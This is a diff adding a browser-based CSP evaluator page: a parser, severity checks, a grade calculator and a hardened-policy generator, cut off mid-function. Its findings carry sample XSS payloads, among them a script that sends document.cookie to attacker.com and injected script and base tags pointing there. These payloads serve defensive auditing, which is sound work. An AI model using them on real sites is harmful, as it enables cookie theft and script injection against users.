@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CSP Policy Evaluator &amp; Security Grader – devnestio</title>
+  <meta name="description" content="Paste your Content-Security-Policy header and get an instant security grade. Detects unsafe-inline, unsafe-eval, wildcard sources, missing directives, and suggests a hardened CSP. Browser-only." />
+  <link rel="canonical" href="https://devnestio.pages.dev/csp-evaluator/" />
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7162190147304602" crossorigin="anonymous"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: system-ui, -apple-system, sans-serif; background: #0f1117; color: #e2e8f0; min-height: 100vh; }
+
+    /* Header */
+    header { background: #1e293b; border-bottom: 1px solid #334155; padding: 12px 20px; display: flex; align-items: center; gap: 14px; }
+    header a { color: #0891b2; text-decoration: none; font-size: 13px; opacity: .8; }
+    header a:hover { opacity: 1; }
+    header h1 { font-size: 18px; font-weight: 700; color: #fff; }
+    header .badge { font-size: 11px; background: rgba(8,145,178,.15); color: #38bdf8; border: 1px solid rgba(8,145,178,.3); border-radius: 4px; padding: 2px 7px; }
+
+    /* Layout */
+    .container { max-width: 1180px; margin: 0 auto; padding: 24px 16px; }
+
+    /* Input area */
+    .input-section { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+    .input-section h2 { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: .07em; margin-bottom: 12px; }
+    .csp-textarea { width: 100%; background: #0f1117; border: 1px solid #334155; border-radius: 8px; padding: 12px 14px; color: #e2e8f0; font-family: 'Courier New', 'Consolas', monospace; font-size: 13px; line-height: 1.6; resize: vertical; min-height: 100px; outline: none; transition: border-color .15s; }
+    .csp-textarea:focus { border-color: #0891b2; }
+    .csp-textarea::placeholder { color: #475569; }
+    .input-actions { display: flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; align-items: center; }
+    .btn-primary { background: #0891b2; border: none; border-radius: 6px; padding: 9px 20px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; transition: background .15s; }
+    .btn-primary:hover { background: #0e7490; }
+    .btn-secondary { background: #1e293b; border: 1px solid #334155; border-radius: 6px; padding: 8px 16px; color: #94a3b8; font-size: 13px; cursor: pointer; transition: all .15s; }
+    .btn-secondary:hover { border-color: #0891b2; color: #38bdf8; }
+    .sample-label { font-size: 12px; color: #64748b; margin-left: 4px; }
+
+    /* Results layout */
+    .results-grid { display: grid; grid-template-columns: 220px 1fr; gap: 20px; margin-bottom: 20px; }
+    @media (max-width: 700px) { .results-grid { grid-template-columns: 1fr; } }
+
+    /* Grade card */
+    .grade-card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 24px 16px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; }
+    .grade-letter { font-size: 80px; font-weight: 900; line-height: 1; }
+    .grade-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: .08em; }
+    .grade-score { font-size: 13px; color: #64748b; }
+    .grade-desc { font-size: 12px; color: #94a3b8; max-width: 160px; text-align: center; line-height: 1.5; }
+
+    /* Summary stats */
+    .summary-panel { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 20px; }
+    .summary-panel h2 { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: .07em; margin-bottom: 16px; }
+    .stats-row { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 16px; }
+    .stat-chip { background: #0f1117; border: 1px solid #334155; border-radius: 8px; padding: 10px 14px; flex: 1; min-width: 80px; text-align: center; }
+    .stat-chip .stat-num { font-size: 22px; font-weight: 700; }
+    .stat-chip .stat-name { font-size: 11px; color: #64748b; margin-top: 2px; }
+    .stat-critical .stat-num { color: #f87171; }
+    .stat-high .stat-num { color: #fb923c; }
+    .stat-medium .stat-num { color: #fbbf24; }
+    .stat-low .stat-num { color: #a3e635; }
+    .stat-info .stat-num { color: #38bdf8; }
+
+    /* Issues list */
+    .issues-list { display: flex; flex-direction: column; gap: 8px; }
+    .issue-item { background: #0f1117; border-left: 3px solid; border-radius: 0 6px 6px 0; padding: 10px 14px; }
+    .issue-item.critical { border-color: #f87171; }
+    .issue-item.high { border-color: #fb923c; }
+    .issue-item.medium { border-color: #fbbf24; }
+    .issue-item.low { border-color: #a3e635; }
+    .issue-item.info { border-color: #38bdf8; }
+    .issue-header { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
+    .severity-badge { font-size: 10px; font-weight: 700; text-transform: uppercase; padding: 2px 6px; border-radius: 3px; letter-spacing: .05em; }
+    .sev-critical { background: rgba(248,113,113,.15); color: #f87171; }
+    .sev-high { background: rgba(251,146,60,.15); color: #fb923c; }
+    .sev-medium { background: rgba(251,191,36,.15); color: #fbbf24; }
+    .sev-low { background: rgba(163,230,53,.15); color: #a3e635; }
+    .sev-info { background: rgba(56,189,248,.15); color: #38bdf8; }
+    .issue-title { font-size: 13px; font-weight: 600; color: #e2e8f0; }
+    .issue-desc { font-size: 12px; color: #94a3b8; line-height: 1.5; }
+    .issue-bypass { margin-top: 6px; background: rgba(248,113,113,.06); border: 1px solid rgba(248,113,113,.2); border-radius: 4px; padding: 6px 10px; }
+    .issue-bypass-label { font-size: 10px; color: #f87171; font-weight: 700; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 4px; }
+    .issue-bypass code { font-size: 11px; color: #fca5a5; font-family: 'Courier New', monospace; word-break: break-all; }
+
+    /* Directives breakdown */
+    .section { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+    .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; letter-spacing: .07em; margin-bottom: 16px; }
+    .directive-table { width: 100%; border-collapse: collapse; }
+    .directive-table th { text-align: left; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: .05em; padding: 6px 10px; border-bottom: 1px solid #334155; }
+    .directive-table td { padding: 10px; font-size: 13px; border-bottom: 1px solid #1e293b; vertical-align: top; }
+    .directive-table tr:last-child td { border-bottom: none; }
+    .directive-table tr:hover td { background: rgba(255,255,255,.02); }
+    .dir-name { font-family: 'Courier New', monospace; color: #38bdf8; font-size: 12px; white-space: nowrap; }
+    .dir-values { font-family: 'Courier New', monospace; font-size: 11px; color: #94a3b8; word-break: break-all; }
+    .dir-values .val-keyword { color: #fbbf24; }
+    .dir-values .val-url { color: #86efac; }
+    .dir-values .val-nonce { color: #c4b5fd; }
+    .dir-values .val-hash { color: #a78bfa; }
+    .dir-values .val-wild { color: #f87171; }
+    .dir-status { white-space: nowrap; }
+    .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
+    .dot-secure { background: #4ade80; }
+    .dot-warning { background: #fbbf24; }
+    .dot-critical { background: #f87171; }
+    .dot-info { background: #38bdf8; }
+    .dir-issues-cell { font-size: 11px; color: #94a3b8; }
+    .dir-issue-badge { display: inline-block; margin-right: 4px; margin-bottom: 3px; padding: 1px 5px; border-radius: 3px; font-size: 10px; }
+    .missing-chip { background: #1e293b; border: 1px dashed #475569; border-radius: 6px; padding: 8px 10px; font-size: 11px; color: #64748b; font-family: monospace; margin-bottom: 6px; display: inline-block; }
+
+    /* Hardened CSP */
+    .hardened-block { background: #0f1117; border: 1px solid #334155; border-radius: 8px; padding: 14px; font-family: 'Courier New', monospace; font-size: 12px; color: #86efac; white-space: pre-wrap; word-break: break-all; line-height: 1.7; position: relative; }
+    .copy-btn { position: absolute; top: 10px; right: 10px; background: #1e293b; border: 1px solid #334155; border-radius: 4px; padding: 4px 10px; font-size: 11px; color: #94a3b8; cursor: pointer; transition: all .15s; font-family: system-ui; }
+    .copy-btn:hover { border-color: #0891b2; color: #38bdf8; }
+    .copy-btn.copied { background: rgba(74,222,128,.1); border-color: #4ade80; color: #4ade80; }
+
+    /* Reference */
+    .ref-toggle { width: 100%; background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 14px 20px; color: #94a3b8; font-size: 13px; text-align: left; cursor: pointer; display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+    .ref-toggle:hover { border-color: #475569; color: #e2e8f0; }
+    .ref-toggle .arrow { transition: transform .2s; }
+    .ref-toggle.open .arrow { transform: rotate(180deg); }
+    .ref-content { background: #1e293b; border: 1px solid #334155; border-top: none; border-radius: 0 0 10px 10px; padding: 0 20px; max-height: 0; overflow: hidden; transition: max-height .3s, padding .3s; }
+    .ref-content.open { max-height: 2000px; padding: 16px 20px; }
+    .ref-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
+    .ref-item { background: #0f1117; border: 1px solid #334155; border-radius: 8px; padding: 12px; }
+    .ref-item-name { font-family: 'Courier New', monospace; font-size: 12px; color: #38bdf8; margin-bottom: 4px; }
+    .ref-item-desc { font-size: 12px; color: #94a3b8; line-height: 1.5; }
+
+    /* Placeholder */
+    .placeholder { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 40px 20px; text-align: center; color: #475569; font-size: 14px; }
+    .placeholder p { margin-top: 8px; font-size: 13px; }
+
+    /* Utilities */
+    .hidden { display: none; }
+    .mt-12 { margin-top: 12px; }
+    .tag { font-size: 10px; font-weight: 700; text-transform: uppercase; padding: 2px 5px; border-radius: 3px; }
+    .tag-missing { background: rgba(248,113,113,.1); color: #f87171; border: 1px solid rgba(248,113,113,.3); }
+    .tag-present { background: rgba(74,222,128,.1); color: #4ade80; border: 1px solid rgba(74,222,128,.3); }
+  </style>
+</head>
+<body>
+
+<header>
+  <a href="/">← devnestio</a>
+  <h1>CSP Evaluator</h1>
+  <span class="badge">Security Grader</span>
+</header>
+
+<div class="container">
+
+  <!-- Input Section -->
+  <div class="input-section">
+    <h2>Content-Security-Policy Header Value</h2>
+    <textarea id="cspInput" class="csp-textarea" rows="4"
+      placeholder="Paste your CSP value here, e.g.: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com; img-src *; object-src 'none'"></textarea>
+    <div class="input-actions">
+      <button class="btn-primary" onclick="evaluateCSP()">Evaluate CSP</button>
+      <span class="sample-label">Load sample:</span>
+      <button class="btn-secondary" onclick="loadSample('weak')">Weak</button>
+      <button class="btn-secondary" onclick="loadSample('medium')">Medium</button>
+      <button class="btn-secondary" onclick="loadSample('strong')">Strong</button>
+      <button class="btn-secondary" onclick="clearInput()">Clear</button>
+    </div>
+  </div>
+
+  <!-- Placeholder shown before evaluation -->
+  <div id="placeholder" class="placeholder">
+    <div style="font-size:32px;opacity:.3">🔒</div>
+    <p>Paste a CSP header value above and click <strong>Evaluate CSP</strong> to get an instant security grade and detailed analysis.</p>
+  </div>
+
+  <!-- Results (hidden until evaluation) -->
+  <div id="results" class="hidden">
+
+    <!-- Grade + Summary -->
+    <div class="results-grid">
+      <div class="grade-card" id="gradeCard">
+        <div class="grade-letter" id="gradeLetter">A+</div>
+        <div class="grade-label">Security Grade</div>
+        <div class="grade-score" id="gradeScore"></div>
+        <div class="grade-desc" id="gradeDesc"></div>
+      </div>
+      <div class="summary-panel">
+        <h2>Findings Summary</h2>
+        <div class="stats-row">
+          <div class="stat-chip stat-critical"><div class="stat-num" id="countCritical">0</div><div class="stat-name">Critical</div></div>
+          <div class="stat-chip stat-high"><div class="stat-num" id="countHigh">0</div><div class="stat-name">High</div></div>
+          <div class="stat-chip stat-medium"><div class="stat-num" id="countMedium">0</div><div class="stat-name">Medium</div></div>
+          <div class="stat-chip stat-low"><div class="stat-num" id="countLow">0</div><div class="stat-name">Low</div></div>
+          <div class="stat-chip stat-info"><div class="stat-num" id="countInfo">0</div><div class="stat-name">Info</div></div>
+        </div>
+        <div id="issuesList" class="issues-list"></div>
+      </div>
+    </div>
+
+    <!-- Per-Directive Analysis -->
+    <div class="section" id="directivesSection">
+      <div class="section-title">Per-Directive Analysis</div>
+      <div id="directivesMissing" style="margin-bottom:12px;"></div>
+      <div style="overflow-x:auto;">
+        <table class="directive-table" id="directiveTable">
+          <thead>
+            <tr>
+              <th>Directive</th>
+              <th>Values</th>
+              <th>Status</th>
+              <th>Notes</th>
+            </tr>
+          </thead>
+          <tbody id="directiveTableBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Hardened CSP suggestion -->
+    <div class="section" id="hardenedSection">
+      <div class="section-title">Suggested Hardened CSP</div>
+      <div style="font-size:12px;color:#64748b;margin-bottom:12px;">Based on your existing CSP, here is a more secure version. Review before applying — some changes may require app updates (e.g., removing unsafe-inline requires nonces/hashes).</div>
+      <div style="position:relative;">
+        <div class="hardened-block" id="hardenedCSP"></div>
+        <button class="copy-btn" onclick="copyHardened(this)">Copy</button>
+      </div>
+    </div>
+
+  </div><!-- /results -->
+
+  <!-- CSP Directives Reference -->
+  <div style="margin-top:8px;">
+    <button class="ref-toggle" id="refToggle" onclick="toggleRef()">
+      <span>CSP Directives Reference</span>
+      <span class="arrow">▼</span>
+    </button>
+    <div class="ref-content" id="refContent">
+      <div class="ref-grid" id="refGrid"></div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script>
+/* ============================================================
+   CSP PARSER
+   ============================================================ */
+function parseCSP(csp) {
+  const directives = {};
+  if (!csp || !csp.trim()) return directives;
+  const parts = csp.split(';');
+  for (const part of parts) {
+    const trimmed = part.trim();
+    if (!trimmed) continue;
+    const tokens = trimmed.split(/\s+/);
+    if (!tokens.length) continue;
+    const name = tokens[0].toLowerCase();
+    const values = tokens.slice(1);
+    if (name) directives[name] = values;
+  }
+  return directives;
+}
+
+/* ============================================================
+   SECURITY CHECKS
+   ============================================================ */
+const SEVERITY_WEIGHT = { critical: 100, high: 40, medium: 15, low: 5, info: 1 };
+
+function hasValue(vals, v) {
+  return vals.some(x => x.toLowerCase() === v.toLowerCase());
+}
+function hasWildcard(vals) {
+  return vals.some(x => x === '*');
+}
+function hasScheme(vals, scheme) {
+  return vals.some(x => x.toLowerCase().startsWith(scheme));
+}
+function effectiveSrc(directives, directive) {
+  return directives[directive] || directives['default-src'] || null;
+}
+
+function runChecks(directives) {
+  const issues = [];
+
+  // ---- default-src ----
+  if (!directives['default-src']) {
+    issues.push({
+      id: 'no-default-src',
+      severity: 'critical',
+      title: 'Missing default-src',
+      description: 'Without a default-src fallback, browsers apply no restrictions to unlisted fetch directives. All resource types lack a safety net.',
+      bypass: null
+    });
+  } else {
+    if (hasWildcard(directives['default-src'])) {
+      issues.push({
+        id: 'default-src-wildcard',
+        severity: 'critical',
+        title: 'default-src allows * (wildcard)',
+        description: 'A wildcard in default-src means any origin can serve any resource type. This defeats the purpose of CSP.',
+        bypass: null
+      });
+    }
+    if (hasValue(directives['default-src'], "'unsafe-inline'")) {
+      issues.push({
+        id: 'default-src-unsafe-inline',
+        severity: 'critical',
+        title: "default-src contains 'unsafe-inline'",
+        description: "'unsafe-inline' in default-src allows inline scripts and styles from any context, enabling XSS.",
+        bypass: '<script>alert(1)</script>'
+      });
+    }
+  }
+
+  // ---- script-src ----
+  const scriptSrc = effectiveSrc(directives, 'script-src');
+  if (!directives['script-src']) {
+    if (directives['default-src']) {
+      issues.push({
+        id: 'no-script-src',
+        severity: 'high',
+        title: 'No explicit script-src (falling back to default-src)',
+        description: 'Best practice is to define an explicit script-src. Relying on default-src may be overly broad.',
+        bypass: null
+      });
+    }
+  }
+
+  if (scriptSrc) {
+    if (hasWildcard(scriptSrc)) {
+      issues.push({
+        id: 'script-src-wildcard',
+        severity: 'critical',
+        title: 'script-src allows * (wildcard)',
+        description: 'Wildcard in script-src allows loading scripts from any origin, completely defeating XSS protection.',
+        bypass: '<script src="https://attacker.com/xss.js"></script>'
+      });
+    }
+    if (hasValue(scriptSrc, "'unsafe-inline'")) {
+      const hasNonce = scriptSrc.some(v => v.startsWith("'nonce-"));
+      const hasHash = scriptSrc.some(v => v.startsWith("'sha256-") || v.startsWith("'sha384-") || v.startsWith("'sha512-"));
+      if (!hasNonce && !hasHash) {
+        issues.push({
+          id: 'script-src-unsafe-inline',
+          severity: 'critical',
+          title: "script-src contains 'unsafe-inline'",
+          description: "'unsafe-inline' allows execution of any inline script, enabling XSS via injected <script> tags or event handlers. Note: unsafe-inline is ignored when a nonce or hash is present.",
+          bypass: '<script>fetch("https://attacker.com/?c="+document.cookie)</script>'
+        });
+      }
+    }
+    if (hasValue(scriptSrc, "'unsafe-eval'")) {
+      issues.push({
+        id: 'script-src-unsafe-eval',
+        severity: 'high',
+        title: "script-src contains 'unsafe-eval'",
+        description: "'unsafe-eval' permits use of eval(), setTimeout(string), setInterval(string), and new Function(string). Attackers who can inject data into these calls can execute arbitrary scripts.",
+        bypass: 'eval(atob("YWxlcnQoMSk="))'
+      });
+    }
+    if (hasScheme(scriptSrc, 'data:')) {
+      issues.push({
+        id: 'script-src-data',
+        severity: 'high',
+        title: "script-src allows 'data:' URIs",
+        description: "The data: scheme in script-src allows execution of base64-encoded scripts, which can be used to bypass other restrictions.",
+        bypass: '<script src="data:text/javascript,alert(1)"></script>'
+      });
+    }
+    if (hasScheme(scriptSrc, 'http:')) {
+      issues.push({
+        id: 'script-src-http',
+        severity: 'high',
+        title: "script-src allows http: scheme",
+        description: "Allowing http: in script-src permits loading scripts over insecure connections, enabling man-in-the-middle attacks that inject malicious scripts.",
+        bypass: null
+      });
+    }
+    // Check for many domains (overly broad allowlist)
+    const urlSources = scriptSrc.filter(v => v.startsWith('http://') || v.startsWith('https://') || v.startsWith('//'));
+    if (urlSources.length >= 5) {
+      issues.push({
+        id: 'script-src-many-origins',
+        severity: 'medium',
+        title: `script-src has ${urlSources.length} allowed origins`,
+        description: "A large allowlist increases attack surface. Every allowed CDN or third-party domain is a potential XSS pivot if any of their served files can be influenced by an attacker. Consider using nonces or hashes instead.",
+        bypass: null
+      });
+    }
+    // Check nonce length hint (we can only inspect the declared nonce, not actual entropy)
+    const nonces = scriptSrc.filter(v => v.startsWith("'nonce-"));
+    for (const nonce of nonces) {
+      const b64 = nonce.slice(7, -1);
+      // base64: 1 char ≈ 6 bits; 128 bits = ceil(128/6) = 22 chars
+      if (b64.length < 22) {
+        issues.push({
+          id: 'short-nonce',
+          severity: 'medium',
+          title: 'Nonce appears to be too short (<128 bits)',
+          description: `Nonce "${b64}" encodes fewer than 128 bits of entropy. NIST recommends at least 128 bits to prevent guessing attacks.`,
+          bypass: null
+        });
+      }
+    }
+  }
+
+  // ---- object-src ----
+  const objectSrc = effectiveSrc(directives, 'object-src');
+  if (!directives['object-src']) {
+    const defHasNone = directives['default-src'] && hasValue(directives['default-src'], "'none'");
+    if (!defHasNone) {
+      issues.push({
+        id: 'no-object-src-none',
+        severity: 'high',
+        title: "Missing object-src 'none'",
+        description: "Without object-src 'none', plugins like Flash (legacy) or PDF viewers can be embedded. These can be used to execute scripts and bypass CSP in older browsers.",
+        bypass: null
+      });
+    }
+  } else if (!hasValue(directives['object-src'], "'none'")) {
+    issues.push({
+      id: 'object-src-not-none',
+      severity: 'high',
+      title: "object-src is not set to 'none'",
+      description: "object-src should be set to 'none' to block plugin-based attacks (Flash, ActiveX, PDF readers with script execution).",
+      bypass: null
+    });
+  }
+
+  // ---- base-uri ----
+  if (!directives['base-uri']) {
+    issues.push({
+      id: 'no-base-uri',
+      severity: 'medium',
+      title: 'Missing base-uri directive',
+      description: "Without base-uri restriction, attackers who can inject a <base href=\"...\"> tag can redirect all relative URLs to an attacker-controlled origin. Recommend: base-uri 'self' or base-uri 'none'.",
+      bypass: '<base href="https://attacker.com/">'
+    });
+  }
+
+  // ---- frame-ancestors ----
+  if (!directives['frame-ancestors']) {
+    issues.push({
+      id: 'no-frame-ancestors',
+      severity: 'medium',
+      title: 'Missing frame-ancestors directive',
+      description: "Without frame-ancestors, your page can be embedded in any iframe, enabling clickjacking attacks. This directive supersedes X-Frame-Options. Recommend: frame-ancestors 'none' or 'self'.",
+      bypass: null
+    });
+  } else if (hasWildcard(directives['frame-ancestors'])) {
+    issues.push({
+      id: 'frame-ancestors-wildcard',
+      severity: 'medium',
+      title: "frame-ancestors allows * (any origin can embed)",
+      description: "A wildcard in frame-ancestors defeats clickjacking protection, allowing any site to embed your page in an iframe.",
+      bypass: null
+    });
+  }
+
+  // ---- form-action ----
+  if (!directives['form-action']) {
+    issues.push({
+      id: 'no-form-action',
+      severity: 'low',
+      title: 'Missing form-action directive',
+      description: "Without form-action, forms can submit to any URL. If an attacker can inject a <form action=\"...\"> tag, they can exfiltrate data. Recommend: form-action 'self'.",
+      bypass: null
+    });
+  }
+
+  // ---- upgrade-insecure-requests / block-all-mixed-content ----
+  if (!directives['upgrade-insecure-requests'] && !directives['block-all-mixed-content']) {
+    issues.push({
+      id: 'no-upgrade-insecure',
+      severity: 'low',
+      title: 'Missing upgrade-insecure-requests or block-all-mixed-content',
+      description: "Without these directives, mixed content (HTTP resources on HTTPS pages) may load. Add upgrade-insecure-requests to auto-upgrade HTTP to HTTPS.",
+      bypass: null
+    });
+  }
+
+  // ---- http: in non-script directives ----
+  const allDirs = Object.keys(directives);
+  for (const dir of allDirs) {
+    if (dir === 'script-src') continue; // already checked above with higher severity
+    if (hasScheme(directives[dir], 'http:') && dir !== 'report-uri') {
+      issues.push({
+        id: `http-scheme-${dir}`,
+        severity: 'medium',
+        title: `http: scheme allowed in ${dir}`,
+        description: `Allowing http: in ${dir} allows resources to be loaded over insecure connections, enabling MITM attacks.`,
+        bypass: null
+      });
+    }
+  }
+
+  // ---- report-uri deprecated ----
+  if (directives['report-uri'] && !directives['report-to']) {
+    issues.push({
+      id: 'report-uri-deprecated',
+      severity: 'info',
+      title: 'report-uri is deprecated — consider report-to',
+      description: "The report-uri directive is deprecated in CSP Level 3. Modern browsers prefer the Reporting API's report-to directive. You can include both for compatibility.",
+      bypass: null
+    });
+  }
+
+  // ---- img-src wildcard ----
+  if (directives['img-src'] && hasWildcard(directives['img-src'])) {
+    issues.push({
+      id: 'img-src-wildcard',
+      severity: 'low',
+      title: 'img-src allows * (any image source)',
+      description: "While less dangerous than script-src wildcards, allowing all image sources enables pixel-tracking, CSRF via image URLs, and information leakage in some scenarios.",
+      bypass: null
+    });
+  }
+
+  // ---- style-src unsafe-inline ----
+  const styleSrc = effectiveSrc(directives, 'style-src');
+  if (styleSrc && hasValue(styleSrc, "'unsafe-inline'")) {
+    const hasNonce = styleSrc.some(v => v.startsWith("'nonce-"));
+    const hasHash = styleSrc.some(v => v.startsWith("'sha256-") || v.startsWith("'sha384-") || v.startsWith("'sha512-"));
+    if (!hasNonce && !hasHash) {
+      issues.push({
+        id: 'style-src-unsafe-inline',
+        severity: 'medium',
+        title: "style-src contains 'unsafe-inline'",
+        description: "'unsafe-inline' in style-src allows injected inline styles, which can be used for UI redressing attacks (fake login forms, clickjacking via CSS).",
+        bypass: '<style>body{display:none}</style><div style="...">Fake login</div>'
+      });
+    }
+  }
+
+  return issues;
+}
+
+/* ============================================================
+   GRADE CALCULATOR
+   ============================================================ */
+function calculateGrade(issues) {
+  let penalty = 0;
+  const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+  for (const issue of issues) {
+    penalty += SEVERITY_WEIGHT[issue.severity] || 0;
+    counts[issue.severity]++;
+  }
+
+  let grade, color, desc;
+  if (counts.critical === 0 && counts.high === 0 && counts.medium === 0 && penalty <= 5) {
+    grade = 'A+'; color = '#4ade80'; desc = 'Excellent — very strong policy';
+  } else if (counts.critical === 0 && counts.high === 0 && penalty <= 30) {
+    grade = 'A'; color = '#4ade80'; desc = 'Strong policy with minor improvements possible';
+  } else if (counts.critical === 0 && counts.high <= 1 && penalty <= 60) {
+    grade = 'B'; color = '#86efac'; desc = 'Good policy with some gaps';
+  } else if (counts.critical === 0 && penalty <= 120) {
+    grade = 'C'; color = '#fbbf24'; desc = 'Moderate policy — several issues need attention';
+  } else if (counts.critical <= 1 && penalty <= 200) {
+    grade = 'D'; color = '#fb923c'; desc = 'Weak policy — critical issues present';
+  } else {
+    grade = 'F'; color = '#f87171'; desc = 'Failing — policy provides little to no protection';
+  }
+
+  return { grade, color, desc, counts, penalty };
+}
+
+/* ============================================================
+   HARDENED CSP GENERATOR
+   ============================================================ */
+function generateHardenedCSP(directives, issues) {
+  const issueIds = new Set(issues.map(i => i.id));
+  const hardened = {};
+
+  // Copy existing directives, cleaning up issues
+  for (const [dir, vals] of Object.entries(directives)) {
+    let newVals = [...vals];
+
+    if (dir === 'script-src' || dir === 'default-src') {
+      newVals = newVals.filter(v => v !== '*' && v.toLowerCase() !== 'http:');
+      if (hasValue(newVals, "'unsafe-inline'")) {
+        const hasNonceOrHash = newVals.some(v => v.startsWith("'nonce-") || v.startsWith("'sha256-") || v.startsWith("'sha384-") || v.startsWith("'sha512-"));
+        if (!hasNonceOrHash) {
+          // Replace with a nonce placeholder
+          newVals = newVals.filter(v => v.toLowerCase() !== "'unsafe-inline'");
+          newVals.push("'nonce-{REPLACE_WITH_RANDOM}'");
+        }
+      }
+      if (hasValue(newVals, "'unsafe-eval'")) {
+        newVals = newVals.filter(v => v.toLowerCase() !== "'unsafe-eval'");
+        // Keep commented note
+      }
+    }
+
+    if (dir === 'img-src') {
+      // Wildcard on img-src is low severity, keep with note
+    }
+
+    hardened[dir] = newVals;
+  }
+
+  // Ensure key directives exist
+  if (!hardened['object-src']) hardened['object-src'] = ["'none'"];
+  else if (!hasValue(hardened['object-src'], "'none'")) hardened['object-src'] = ["'none'"];
+
+  if (!hardened['base-uri']) hardened['base-uri'] = ["'self'"];
+  if (!hardened['frame-ancestors']) hardened['frame-ancestors'] = ["'none'"];
+  if (!hardened['form-action']) hardened['form-action'] = ["'self'"];
+  if (!hardened['upgrade-insecure-requests'] && !hardened['block-all-mixed-content']) {
+    hardened['upgrade-insecure-requests'] = [];
+  }
+
+  // Remove report-uri if report-to is missing (suggest adding report-to)
+  // Build the CSP string
+  const parts = [];
+  const order = [
+    'default-src', 'script-src', 'style-src', 'img-src', 'font-src',
+    'connect-src', 'media-src', 'object-src', 'frame-src', 'frame-ancestors',
+    'base-uri', 'form-action', 'upgrade-insecure-requests', 'block-all-mixed-content',
+    'worker-src', 'manifest-src', 'prefetch-src', 'report-to', 'report-uri'
+  ];
+
+  const ordered = [...order.filter(k => hardened[k] !== undefined)];
+  const rest = Object.keys(hardened).filter(k => !order.includes(k));
+
+  for (const dir of [...ordered, ...rest]) {
+    const vals = hardened[dir];
+    if (vals.length === 0) {
+      parts.push(dir);
+    } else {
+      parts.push(`${dir} ${vals.join(' ')}`);
+    }
+  }
+
+  return parts.join(';\n') + ';';
+}
+
+/* ============================================================
+   DIRECTIVE STATUS CALCULATOR
+   ============================================================ */
+function getDirectiveStatus(name, vals, issues) {
+  const relatedIssues = issues.filter(i => {
+    const lower = i.id.toLowerCase();
+    return lower.includes(name.replace('-', '')) ||
+           lower.includes(name.split('-')[0]) ||
+           (i.title && i.title.toLowerCase().includes(name));
+  });
+
+  if (relatedIssues.some(i => i.severity === 'critical')) return { status: 'critical', dot: 'dot-critical', label: 'Critical' };
+  if (relatedIssues.some(i => i.severity === 'high')) return { status: 'warning', dot: 'dot-warning', label: 'Warning' };
+  if (relatedIssues.some(i => i.severity === 'medium')) return { status: 'warning', dot: 'dot-warning', label: 'Caution' };
+  return { status: 'secure', dot: 'dot-secure', label: 'OK' };
+}
+
+function formatValues(vals) {
+  return vals.map(v => {
+    if (v === '*') return `<span class="val-wild">${v}</span>`;
+    if (v.startsWith("'nonce-")) return `<span class="val-nonce">${v}</span>`;
+    if (v.startsWith("'sha256-") || v.startsWith("'sha384-") || v.startsWith("'sha512-")) return `<span class="val-hash">${v}</span>`;
+    if (v.startsWith("'")) return `<span class="val-keyword">${v}</span>`;
+    if (v.startsWith('http://') || v.startsWith('https://') || v.startsWith('//')) return `<span class="val-url">${v}</span>`;
+    return `<span class="val-keyword">${v}</span>`;
+  }).join(' ');
+}
+
+/* ============================================================
+   MISSING DIRECTIVES PANEL
+   ============================================================ */
+const IMPORTANT_DIRECTIVES = [
+  'default-src', 'script-src', 'style-src', 'img-src', 'font-src',
+  'connect-src', 'object-src', 'frame-ancestors', 'base-uri', 'form-action'
+];
+
+/* ============================================================
+   SAMPLES
+   ============================================================ */
+const SAMPLES = {
+  weak: "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src *",
+  medium: "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://ajax.googleapis.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; object-src 'none'; report-uri /csp-report",
+  strong: "default-src 'none'; script-src 'self' 'nonce-rAnd0mN0nce128bit==' https://cdn.example.com; style-src 'self' 'nonce-rAnd0mN0nce128bit=='; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests; report-to csp-endpoint"
+};
+
+function loadSample(type) {
+  document.getElementById('cspInput').value = SAMPLES[type];
+  evaluateCSP();
+}
+
+function clearInput() {
+  document.getElementById('cspInput').value = '';
+  document.getElementById('results').classList.add('hidden');
+  document.getElementById('placeholder').classList.remove('hidden');
+}
+
+/* ============================================================
+   MAIN EVALUATOR
+   ============================================================ */
+function evaluateCSP() {
+  const raw = document.getElementById('cspInput').value.trim();
+  if (!raw) { clearInput(); return; }
+
+  const directives = parseCSP(raw);
+  const issues = runChecks(directives);
+  const { grade, color, desc, counts, penalty } = calculateGrade(issues);
